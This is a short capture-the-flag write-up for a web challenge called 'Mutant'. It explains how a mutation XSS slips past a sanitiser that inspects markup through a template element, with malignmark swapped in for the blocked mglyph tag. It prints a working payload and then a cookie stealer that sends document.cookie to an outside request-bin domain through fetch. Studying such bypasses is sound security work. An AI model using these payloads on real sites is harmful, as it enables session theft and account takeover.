Mutant
============

The JavaScript includes some code that removes elements with length 6 or 8, as well as removing attributes from elements.

Because it uses a template innerHTML to check the elements in the payload, we can use a mutation XSS to bypass it as described [here](https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/).

The issue with the payload at that link is that the payload uses `mglyph` which is blocked by the waf. However, it also tells us that `malignmark` is an alternative for `mglyph`, so we can use that instead.

```html
<form><math><mtext></form><form><malignmark><style></math><img src onerror=alert(1)>
```

We can then replace the JavaScript with a cookie stealer to exfiltrate the cookie back to our domain, for example:

```html
<form><math><mtext></form><form><malignmark><style></math><img src=1 onerror="fetch(`https://myrequestbin.com/${document.cookie}`)">
```
